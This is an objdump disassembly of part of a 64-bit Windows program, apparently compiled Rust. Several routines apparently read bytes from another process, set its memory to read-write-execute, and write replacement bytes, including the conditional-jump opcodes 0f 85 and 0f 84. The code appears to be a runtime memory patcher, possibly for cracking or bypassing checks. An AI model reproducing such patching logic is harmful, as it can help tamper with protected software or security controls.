   140003e01:	45 31 c0             	xor    %r8d,%r8d
   140003e04:	48 f7 e2             	mul    %rdx
   140003e07:	41 0f 91 c0          	setno  %r8b
   140003e0b:	49 c1 e0 03          	shl    $0x3,%r8
   140003e0f:	48 85 c9             	test   %rcx,%rcx
   140003e12:	74 1c                	je     0x140003e30
   140003e14:	48 8b 16             	mov    (%rsi),%rdx
   140003e17:	48 c1 e1 03          	shl    $0x3,%rcx
   140003e1b:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140003e20:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003e25:	48 c7 44 24 30 08 00 	movq   $0x8,0x30(%rsp)
   140003e2c:	00 00 
   140003e2e:	eb 09                	jmp    0x140003e39
   140003e30:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003e37:	00 00 
   140003e39:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140003e3e:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   140003e43:	48 89 c2             	mov    %rax,%rdx
   140003e46:	e8 e5 fd ff ff       	call   0x140003c30
   140003e4b:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003e50:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140003e55:	48 83 7c 24 38 01    	cmpq   $0x1,0x38(%rsp)
   140003e5b:	74 11                	je     0x140003e6e
   140003e5d:	48 89 0e             	mov    %rcx,(%rsi)
   140003e60:	48 c1 ea 03          	shr    $0x3,%rdx
   140003e64:	48 89 56 08          	mov    %rdx,0x8(%rsi)
   140003e68:	48 83 c4 50          	add    $0x50,%rsp
   140003e6c:	5e                   	pop    %rsi
   140003e6d:	c3                   	ret
   140003e6e:	48 85 d2             	test   %rdx,%rdx
   140003e71:	75 07                	jne    0x140003e7a
   140003e73:	e8 a8 57 01 00       	call   0x140019620
   140003e78:	0f 0b                	ud2
   140003e7a:	e8 91 ba 01 00       	call   0x14001f910
   140003e7f:	0f 0b                	ud2
   140003e81:	cc                   	int3
   140003e82:	cc                   	int3
   140003e83:	cc                   	int3
   140003e84:	cc                   	int3
   140003e85:	cc                   	int3
   140003e86:	cc                   	int3
   140003e87:	cc                   	int3
   140003e88:	cc                   	int3
   140003e89:	cc                   	int3
   140003e8a:	cc                   	int3
   140003e8b:	cc                   	int3
   140003e8c:	cc                   	int3
   140003e8d:	cc                   	int3
   140003e8e:	cc                   	int3
   140003e8f:	cc                   	int3
   140003e90:	41 57                	push   %r15
   140003e92:	41 56                	push   %r14
   140003e94:	41 55                	push   %r13
   140003e96:	41 54                	push   %r12
   140003e98:	56                   	push   %rsi
   140003e99:	57                   	push   %rdi
   140003e9a:	55                   	push   %rbp
   140003e9b:	53                   	push   %rbx
   140003e9c:	48 83 ec 48          	sub    $0x48,%rsp
   140003ea0:	48 89 d0             	mov    %rdx,%rax
   140003ea3:	49 8b 51 10          	mov    0x10(%r9),%rdx
   140003ea7:	48 83 fa 06          	cmp    $0x6,%rdx
   140003eab:	0f 86 b7 01 00 00    	jbe    0x140004068
   140003eb1:	49 89 cc             	mov    %rcx,%r12
   140003eb4:	4d 8b 38             	mov    (%r8),%r15
   140003eb7:	49 8b 31             	mov    (%r9),%rsi
   140003eba:	48 8b 38             	mov    (%rax),%rdi
   140003ebd:	48 8b 5e 30          	mov    0x30(%rsi),%rbx
   140003ec1:	4c 01 fb             	add    %r15,%rbx
   140003ec4:	48 8b 01             	mov    (%rcx),%rax
   140003ec7:	44 8b 70 05          	mov    0x5(%rax),%r14d
   140003ecb:	44 0f b7 68 09       	movzwl 0x9(%rax),%r13d
   140003ed0:	66 c7 44 24 2c 00 00 	movw   $0x0,0x2c(%rsp)
   140003ed7:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140003ede:	00 
   140003edf:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003ee6:	00 00 
   140003ee8:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   140003eed:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   140003ef3:	48 89 f9             	mov    %rdi,%rcx
   140003ef6:	48 89 da             	mov    %rbx,%rdx
   140003ef9:	e8 74 a8 01 00       	call   0x14001e772
   140003efe:	8b 44 24 28          	mov    0x28(%rsp),%eax
   140003f02:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140003f07:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   140003f0b:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003f10:	66 44 89 6c 24 2c    	mov    %r13w,0x2c(%rsp)
   140003f16:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140003f1b:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%rsp)
   140003f22:	00 
   140003f23:	48 8d 6c 24 34       	lea    0x34(%rsp),%rbp
   140003f28:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140003f2d:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140003f33:	48 89 f9             	mov    %rdi,%rcx
   140003f36:	48 89 da             	mov    %rbx,%rdx
   140003f39:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140003f3f:	e8 22 a8 01 00       	call   0x14001e766
   140003f44:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003f4b:	00 00 
   140003f4d:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   140003f53:	48 89 f9             	mov    %rdi,%rcx
   140003f56:	48 89 da             	mov    %rbx,%rdx
   140003f59:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   140003f5e:	4d 89 c5             	mov    %r8,%r13
   140003f61:	e8 06 a8 01 00       	call   0x14001e76c
   140003f66:	44 8b 4c 24 34       	mov    0x34(%rsp),%r9d
   140003f6b:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140003f70:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140003f76:	48 89 f9             	mov    %rdi,%rcx
   140003f79:	48 89 da             	mov    %rbx,%rdx
   140003f7c:	e8 e5 a7 01 00       	call   0x14001e766
   140003f81:	49 8b 04 24          	mov    (%r12),%rax
   140003f85:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140003f8a:	66 89 48 09          	mov    %cx,0x9(%rax)
   140003f8e:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003f93:	89 48 05             	mov    %ecx,0x5(%rax)
   140003f96:	48 8b 46 30          	mov    0x30(%rsi),%rax
   140003f9a:	49 8d 5c 07 0d       	lea    0xd(%r15,%rax,1),%rbx
   140003f9f:	49 8b 04 24          	mov    (%r12),%rax
   140003fa3:	8b 70 0b             	mov    0xb(%rax),%esi
   140003fa6:	0f b7 68 0f          	movzwl 0xf(%rax),%ebp
   140003faa:	66 c7 44 24 2c 00 00 	movw   $0x0,0x2c(%rsp)
   140003fb1:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140003fb8:	00 
   140003fb9:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003fc0:	00 00 
   140003fc2:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   140003fc8:	48 89 f9             	mov    %rdi,%rcx
   140003fcb:	48 89 da             	mov    %rbx,%rdx
   140003fce:	4d 89 e8             	mov    %r13,%r8
   140003fd1:	e8 9c a7 01 00       	call   0x14001e772
   140003fd6:	44 8b 74 24 28       	mov    0x28(%rsp),%r14d
   140003fdb:	44 8b 7c 24 2c       	mov    0x2c(%rsp),%r15d
   140003fe0:	66 89 6c 24 2c       	mov    %bp,0x2c(%rsp)
   140003fe5:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140003fe9:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140003ff0:	00 
   140003ff1:	48 8d 74 24 30       	lea    0x30(%rsp),%rsi
   140003ff6:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003ffb:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140004001:	48 89 f9             	mov    %rdi,%rcx
   140004004:	48 89 da             	mov    %rbx,%rdx
   140004007:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   14000400d:	e8 54 a7 01 00       	call   0x14001e766
   140004012:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004019:	00 00 
   14000401b:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   140004021:	48 89 f9             	mov    %rdi,%rcx
   140004024:	48 89 da             	mov    %rbx,%rdx
   140004027:	4d 89 e8             	mov    %r13,%r8
   14000402a:	e8 3d a7 01 00       	call   0x14001e76c
   14000402f:	44 8b 4c 24 30       	mov    0x30(%rsp),%r9d
   140004034:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004039:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   14000403f:	48 89 f9             	mov    %rdi,%rcx
   140004042:	48 89 da             	mov    %rbx,%rdx
   140004045:	e8 1c a7 01 00       	call   0x14001e766
   14000404a:	49 8b 04 24          	mov    (%r12),%rax
   14000404e:	66 44 89 78 0f       	mov    %r15w,0xf(%rax)
   140004053:	44 89 70 0b          	mov    %r14d,0xb(%rax)
   140004057:	48 83 c4 48          	add    $0x48,%rsp
   14000405b:	5b                   	pop    %rbx
   14000405c:	5d                   	pop    %rbp
   14000405d:	5f                   	pop    %rdi
   14000405e:	5e                   	pop    %rsi
   14000405f:	41 5c                	pop    %r12
   140004061:	41 5d                	pop    %r13
   140004063:	41 5e                	pop    %r14
   140004065:	41 5f                	pop    %r15
   140004067:	c3                   	ret
   140004068:	4c 8d 05 99 d9 01 00 	lea    0x1d999(%rip),%r8        # 0x140021a08
   14000406f:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004074:	e8 07 ba 01 00       	call   0x14001fa80
   140004079:	0f 0b                	ud2
   14000407b:	cc                   	int3
   14000407c:	cc                   	int3
   14000407d:	cc                   	int3
   14000407e:	cc                   	int3
   14000407f:	cc                   	int3
   140004080:	41 57                	push   %r15
   140004082:	41 56                	push   %r14
   140004084:	41 55                	push   %r13
   140004086:	41 54                	push   %r12
   140004088:	56                   	push   %rsi
   140004089:	57                   	push   %rdi
   14000408a:	55                   	push   %rbp
   14000408b:	53                   	push   %rbx
   14000408c:	48 83 ec 48          	sub    $0x48,%rsp
   140004090:	49 8b 41 10          	mov    0x10(%r9),%rax
   140004094:	48 83 f8 06          	cmp    $0x6,%rax
   140004098:	0f 86 3b 02 00 00    	jbe    0x1400042d9
   14000409e:	49 89 cc             	mov    %rcx,%r12
   1400040a1:	49 8b 30             	mov    (%r8),%rsi
   1400040a4:	4d 8b 31             	mov    (%r9),%r14
   1400040a7:	48 8b 3a             	mov    (%rdx),%rdi
   1400040aa:	49 8b 5e 30          	mov    0x30(%r14),%rbx
   1400040ae:	48 01 f3             	add    %rsi,%rbx
   1400040b1:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400040b6:	48 8b 01             	mov    (%rcx),%rax
   1400040b9:	8b 68 05             	mov    0x5(%rax),%ebp
   1400040bc:	44 0f b7 68 09       	movzwl 0x9(%rax),%r13d
   1400040c1:	66 c7 44 24 2c 00 00 	movw   $0x0,0x2c(%rsp)
   1400040c8:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   1400040cf:	00 
   1400040d0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400040d7:	00 00 
   1400040d9:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   1400040de:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   1400040e4:	48 89 f9             	mov    %rdi,%rcx
   1400040e7:	48 89 da             	mov    %rbx,%rdx
   1400040ea:	e8 83 a6 01 00       	call   0x14001e772
   1400040ef:	8b 44 24 28          	mov    0x28(%rsp),%eax
   1400040f3:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400040f8:	44 8b 7c 24 2c       	mov    0x2c(%rsp),%r15d
   1400040fd:	66 44 89 6c 24 2c    	mov    %r13w,0x2c(%rsp)
   140004103:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   140004107:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%rsp)
   14000410e:	00 
   14000410f:	48 8d 44 24 34       	lea    0x34(%rsp),%rax
   140004114:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004119:	48 89 c5             	mov    %rax,%rbp
   14000411c:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140004122:	48 89 f9             	mov    %rdi,%rcx
   140004125:	48 89 da             	mov    %rbx,%rdx
   140004128:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   14000412e:	e8 33 a6 01 00       	call   0x14001e766
   140004133:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000413a:	00 00 
   14000413c:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   140004142:	48 89 f9             	mov    %rdi,%rcx
   140004145:	48 89 da             	mov    %rbx,%rdx
   140004148:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   14000414d:	e8 1a a6 01 00       	call   0x14001e76c
   140004152:	44 8b 4c 24 34       	mov    0x34(%rsp),%r9d
   140004157:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   14000415c:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140004162:	48 89 f9             	mov    %rdi,%rcx
   140004165:	48 89 da             	mov    %rbx,%rdx
   140004168:	e8 f9 a5 01 00       	call   0x14001e766
   14000416d:	49 8b 04 24          	mov    (%r12),%rax
   140004171:	66 44 89 78 09       	mov    %r15w,0x9(%rax)
   140004176:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000417b:	89 48 05             	mov    %ecx,0x5(%rax)
   14000417e:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140004183:	49 8b 46 30          	mov    0x30(%r14),%rax
   140004187:	48 8d 5c 06 0d       	lea    0xd(%rsi,%rax,1),%rbx
   14000418c:	49 8b 04 24          	mov    (%r12),%rax
   140004190:	44 8b 68 0b          	mov    0xb(%rax),%r13d
   140004194:	0f b7 68 0f          	movzwl 0xf(%rax),%ebp
   140004198:	66 c7 44 24 2c 00 00 	movw   $0x0,0x2c(%rsp)
   14000419f:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   1400041a6:	00 
   1400041a7:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400041ae:	00 00 
   1400041b0:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   1400041b6:	48 89 f9             	mov    %rdi,%rcx
   1400041b9:	48 89 da             	mov    %rbx,%rdx
   1400041bc:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   1400041c1:	e8 ac a5 01 00       	call   0x14001e772
   1400041c6:	44 8b 74 24 28       	mov    0x28(%rsp),%r14d
   1400041cb:	44 8b 7c 24 2c       	mov    0x2c(%rsp),%r15d
   1400041d0:	66 89 6c 24 2c       	mov    %bp,0x2c(%rsp)
   1400041d5:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   1400041da:	4c 8d 6c 24 28       	lea    0x28(%rsp),%r13
   1400041df:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%rsp)
   1400041e6:	00 
   1400041e7:	48 8d 6c 24 34       	lea    0x34(%rsp),%rbp
   1400041ec:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400041f1:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   1400041f7:	48 89 f9             	mov    %rdi,%rcx
   1400041fa:	48 89 da             	mov    %rbx,%rdx
   1400041fd:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140004203:	e8 5e a5 01 00       	call   0x14001e766
   140004208:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000420f:	00 00 
   140004211:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   140004217:	48 89 f9             	mov    %rdi,%rcx
   14000421a:	48 89 da             	mov    %rbx,%rdx
   14000421d:	4d 89 e8             	mov    %r13,%r8
   140004220:	e8 47 a5 01 00       	call   0x14001e76c
   140004225:	44 8b 4c 24 34       	mov    0x34(%rsp),%r9d
   14000422a:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   14000422f:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140004235:	48 89 f9             	mov    %rdi,%rcx
   140004238:	48 89 da             	mov    %rbx,%rdx
   14000423b:	e8 26 a5 01 00       	call   0x14001e766
   140004240:	49 8b 04 24          	mov    (%r12),%rax
   140004244:	66 44 89 78 0f       	mov    %r15w,0xf(%rax)
   140004249:	44 89 70 0b          	mov    %r14d,0xb(%rax)
   14000424d:	48 83 7c 24 40 07    	cmpq   $0x7,0x40(%rsp)
   140004253:	0f 84 96 00 00 00    	je     0x1400042ef
   140004259:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   14000425e:	48 03 70 38          	add    0x38(%rax),%rsi
   140004262:	66 c7 44 24 34 0f 85 	movw   $0x850f,0x34(%rsp)
   140004269:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140004270:	00 
   140004271:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140004276:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000427c:	48 89 f9             	mov    %rdi,%rcx
   14000427f:	48 89 f2             	mov    %rsi,%rdx
   140004282:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140004288:	e8 d9 a4 01 00       	call   0x14001e766
   14000428d:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004294:	00 00 
   140004296:	4c 8d 44 24 34       	lea    0x34(%rsp),%r8
   14000429b:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   1400042a1:	48 89 f9             	mov    %rdi,%rcx
   1400042a4:	48 89 f2             	mov    %rsi,%rdx
   1400042a7:	e8 c0 a4 01 00       	call   0x14001e76c
   1400042ac:	44 8b 4c 24 28       	mov    0x28(%rsp),%r9d
   1400042b1:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   1400042b6:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400042bc:	48 89 f9             	mov    %rdi,%rcx
   1400042bf:	48 89 f2             	mov    %rsi,%rdx
   1400042c2:	e8 9f a4 01 00       	call   0x14001e766
   1400042c7:	90                   	nop
   1400042c8:	48 83 c4 48          	add    $0x48,%rsp
   1400042cc:	5b                   	pop    %rbx
   1400042cd:	5d                   	pop    %rbp
   1400042ce:	5f                   	pop    %rdi
   1400042cf:	5e                   	pop    %rsi
   1400042d0:	41 5c                	pop    %r12
   1400042d2:	41 5d                	pop    %r13
   1400042d4:	41 5e                	pop    %r14
   1400042d6:	41 5f                	pop    %r15
   1400042d8:	c3                   	ret
   1400042d9:	4c 8d 05 40 d7 01 00 	lea    0x1d740(%rip),%r8        # 0x140021a20
   1400042e0:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400042e5:	48 89 c2             	mov    %rax,%rdx
   1400042e8:	e8 93 b7 01 00       	call   0x14001fa80
   1400042ed:	0f 0b                	ud2
   1400042ef:	4c 8d 05 42 d7 01 00 	lea    0x1d742(%rip),%r8        # 0x140021a38
   1400042f6:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400042fb:	ba 07 00 00 00       	mov    $0x7,%edx
   140004300:	e8 7b b7 01 00       	call   0x14001fa80
   140004305:	0f 0b                	ud2
   140004307:	cc                   	int3
   140004308:	cc                   	int3
   140004309:	cc                   	int3
   14000430a:	cc                   	int3
   14000430b:	cc                   	int3
   14000430c:	cc                   	int3
   14000430d:	cc                   	int3
   14000430e:	cc                   	int3
   14000430f:	cc                   	int3
   140004310:	56                   	push   %rsi
   140004311:	57                   	push   %rdi
   140004312:	53                   	push   %rbx
   140004313:	48 83 ec 40          	sub    $0x40,%rsp
   140004317:	4c 89 cb             	mov    %r9,%rbx
   14000431a:	4c 89 c6             	mov    %r8,%rsi
   14000431d:	48 89 d7             	mov    %rdx,%rdi
   140004320:	b9 20 00 00 00       	mov    $0x20,%ecx
   140004325:	e8 62 a5 01 00       	call   0x14001e88c
   14000432a:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   14000432e:	66 85 c0             	test   %ax,%ax
   140004331:	74 6d                	je     0x1400043a0
   140004333:	48 83 fa 07          	cmp    $0x7,%rdx
   140004337:	0f 86 ed 00 00 00    	jbe    0x14000442a
   14000433d:	48 8b 03             	mov    (%rbx),%rax
   140004340:	48 8b 3f             	mov    (%rdi),%rdi
   140004343:	48 8b 58 38          	mov    0x38(%rax),%rbx
   140004347:	48 03 1e             	add    (%rsi),%rbx
   14000434a:	66 c7 44 24 36 0f 84 	movw   $0x840f,0x36(%rsp)
   140004351:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%rsp)
   140004358:	00 
   140004359:	48 8d 74 24 3c       	lea    0x3c(%rsp),%rsi
   14000435e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004363:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004369:	48 89 f9             	mov    %rdi,%rcx
   14000436c:	48 89 da             	mov    %rbx,%rdx
   14000436f:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140004375:	e8 ec a3 01 00       	call   0x14001e766
   14000437a:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004381:	00 00 
   140004383:	4c 8d 44 24 36       	lea    0x36(%rsp),%r8
   140004388:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   14000438e:	48 89 f9             	mov    %rdi,%rcx
   140004391:	48 89 da             	mov    %rbx,%rdx
   140004394:	e8 d3 a3 01 00       	call   0x14001e76c
   140004399:	44 8b 4c 24 3c       	mov    0x3c(%rsp),%r9d
   14000439e:	eb 6b                	jmp    0x14000440b
   1400043a0:	48 83 fa 07          	cmp    $0x7,%rdx
   1400043a4:	0f 86 89 00 00 00    	jbe    0x140004433
   1400043aa:	48 8b 03             	mov    (%rbx),%rax
   1400043ad:	48 8b 3f             	mov    (%rdi),%rdi
   1400043b0:	48 8b 58 38          	mov    0x38(%rax),%rbx
   1400043b4:	48 03 1e             	add    (%rsi),%rbx
   1400043b7:	66 c7 44 24 34 0f 85 	movw   $0x850f,0x34(%rsp)
   1400043be:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   1400043c5:	00 
   1400043c6:	48 8d 74 24 38       	lea    0x38(%rsp),%rsi
   1400043cb:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400043d0:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400043d6:	48 89 f9             	mov    %rdi,%rcx
   1400043d9:	48 89 da             	mov    %rbx,%rdx
   1400043dc:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   1400043e2:	e8 7f a3 01 00       	call   0x14001e766
   1400043e7:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400043ee:	00 00 
   1400043f0:	4c 8d 44 24 34       	lea    0x34(%rsp),%r8
   1400043f5:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   1400043fb:	48 89 f9             	mov    %rdi,%rcx
   1400043fe:	48 89 da             	mov    %rbx,%rdx
   140004401:	e8 66 a3 01 00       	call   0x14001e76c
   140004406:	44 8b 4c 24 38       	mov    0x38(%rsp),%r9d
   14000440b:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004410:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004416:	48 89 f9             	mov    %rdi,%rcx
   140004419:	48 89 da             	mov    %rbx,%rdx
   14000441c:	e8 45 a3 01 00       	call   0x14001e766
   140004421:	90                   	nop
   140004422:	48 83 c4 40          	add    $0x40,%rsp
   140004426:	5b                   	pop    %rbx
   140004427:	5f                   	pop    %rdi
   140004428:	5e                   	pop    %rsi
   140004429:	c3                   	ret
   14000442a:	4c 8d 05 1f d6 01 00 	lea    0x1d61f(%rip),%r8        # 0x140021a50
   140004431:	eb 07                	jmp    0x14000443a
   140004433:	4c 8d 05 2e d6 01 00 	lea    0x1d62e(%rip),%r8        # 0x140021a68
   14000443a:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000443f:	e8 3c b6 01 00       	call   0x14001fa80
   140004444:	0f 0b                	ud2
   140004446:	cc                   	int3
   140004447:	cc                   	int3
   140004448:	cc                   	int3
   140004449:	cc                   	int3
   14000444a:	cc                   	int3
   14000444b:	cc                   	int3
   14000444c:	cc                   	int3
   14000444d:	cc                   	int3
   14000444e:	cc                   	int3
   14000444f:	cc                   	int3
   140004450:	55                   	push   %rbp
   140004451:	41 56                	push   %r14
   140004453:	56                   	push   %rsi
   140004454:	57                   	push   %rdi
   140004455:	53                   	push   %rbx
   140004456:	48 83 ec 50          	sub    $0x50,%rsp
   14000445a:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   14000445f:	48 c7 45 f8 fe ff ff 	movq   $0xfffffffffffffffe,-0x8(%rbp)
   140004466:	ff 
   140004467:	4c 89 c6             	mov    %r8,%rsi
   14000446a:	48 89 d7             	mov    %rdx,%rdi
   14000446d:	48 89 cb             	mov    %rcx,%rbx
   140004470:	4c 8d 75 e0          	lea    -0x20(%rbp),%r14
   140004474:	eb 1e                	jmp    0x140004494
   140004476:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000447d:	00 00 00 
   140004480:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140004484:	ba 18 00 00 00       	mov    $0x18,%edx
   140004489:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   14000448f:	e8 8c 09 00 00       	call   0x140004e20
   140004494:	48 85 f6             	test   %rsi,%rsi
   140004497:	0f 84 93 00 00 00    	je     0x140004530
   14000449d:	4c 89 f1             	mov    %r14,%rcx
   1400044a0:	48 89 da             	mov    %rbx,%rdx
   1400044a3:	49 89 f8             	mov    %rdi,%r8
   1400044a6:	49 89 f1             	mov    %rsi,%r9
   1400044a9:	e8 32 45 00 00       	call   0x1400089e0
   1400044ae:	83 7d e0 01          	cmpl   $0x1,-0x20(%rbp)
   1400044b2:	75 5c                	jne    0x140004510
   1400044b4:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   1400044b8:	e8 83 4b 00 00       	call   0x140009040
   1400044bd:	3c 0f                	cmp    $0xf,%al
   1400044bf:	0f 85 db 00 00 00    	jne    0x1400045a0
   1400044c5:	83 7d e0 01          	cmpl   $0x1,-0x20(%rbp)
   1400044c9:	75 c9                	jne    0x140004494
   1400044cb:	80 7d e8 02          	cmpb   $0x2,-0x18(%rbp)
   1400044cf:	72 c3                	jb     0x140004494
   1400044d1:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400044d5:	48 8b 08             	mov    (%rax),%rcx
   1400044d8:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   1400044dc:	48 8b 40 08          	mov    0x8(%rax),%rax
   1400044e0:	ff 10                	call   *(%rax)
   1400044e2:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
   1400044e6:	48 8b 41 08          	mov    0x8(%rcx),%rax
   1400044ea:	48 8b 50 08          	mov    0x8(%rax),%rdx
   1400044ee:	48 85 d2             	test   %rdx,%rdx
   1400044f1:	74 8d                	je     0x140004480
   1400044f3:	48 8b 09             	mov    (%rcx),%rcx
   1400044f6:	4c 8b 40 10          	mov    0x10(%rax),%r8
   1400044fa:	e8 21 09 00 00       	call   0x140004e20
   1400044ff:	e9 7c ff ff ff       	jmp    0x140004480
   140004504:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000450b:	00 00 00 
   14000450e:	66 90                	xchg   %ax,%ax
   140004510:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140004514:	48 85 c9             	test   %rcx,%rcx
   140004517:	74 1e                	je     0x140004537
   140004519:	48 89 f0             	mov    %rsi,%rax
   14000451c:	48 29 c8             	sub    %rcx,%rax
   14000451f:	0f 82 b3 00 00 00    	jb     0x1400045d8
   140004525:	48 01 cf             	add    %rcx,%rdi
   140004528:	48 89 c6             	mov    %rax,%rsi
   14000452b:	e9 64 ff ff ff       	jmp    0x140004494
   140004530:	b0 03                	mov    $0x3,%al
   140004532:	e9 87 00 00 00       	jmp    0x1400045be
   140004537:	b9 1c 00 00 00       	mov    $0x1c,%ecx
   14000453c:	31 d2                	xor    %edx,%edx
   14000453e:	e8 6d f7 ff ff       	call   0x140003cb0
   140004543:	48 89 c6             	mov    %rax,%rsi
   140004546:	48 89 d7             	mov    %rdx,%rdi
   140004549:	0f 10 05 c4 d5 01 00 	movups 0x1d5c4(%rip),%xmm0        # 0x140021b14
   140004550:	0f 11 40 0c          	movups %xmm0,0xc(%rax)
   140004554:	0f 10 05 ad d5 01 00 	movups 0x1d5ad(%rip),%xmm0        # 0x140021b08
   14000455b:	0f 11 00             	movups %xmm0,(%rax)
   14000455e:	b9 18 00 00 00       	mov    $0x18,%ecx
   140004563:	ba 08 00 00 00       	mov    $0x8,%edx
   140004568:	e8 a3 08 00 00       	call   0x140004e10
   14000456d:	48 85 c0             	test   %rax,%rax
   140004570:	74 77                	je     0x1400045e9
   140004572:	48 89 30             	mov    %rsi,(%rax)
   140004575:	48 89 78 08          	mov    %rdi,0x8(%rax)
   140004579:	48 c7 40 10 1c 00 00 	movq   $0x1c,0x10(%rax)
   140004580:	00 
   140004581:	4c 8d 05 d0 d3 01 00 	lea    0x1d3d0(%rip),%r8        # 0x140021958
   140004588:	b1 0e                	mov    $0xe,%cl
   14000458a:	48 89 c2             	mov    %rax,%rdx
   14000458d:	e8 5e 4a 00 00       	call   0x140008ff0
   140004592:	48 89 c1             	mov    %rax,%rcx
   140004595:	48 0f ac d1 08       	shrd   $0x8,%rdx,%rcx
   14000459a:	48 c1 ea 08          	shr    $0x8,%rdx
   14000459e:	eb 1e                	jmp    0x1400045be
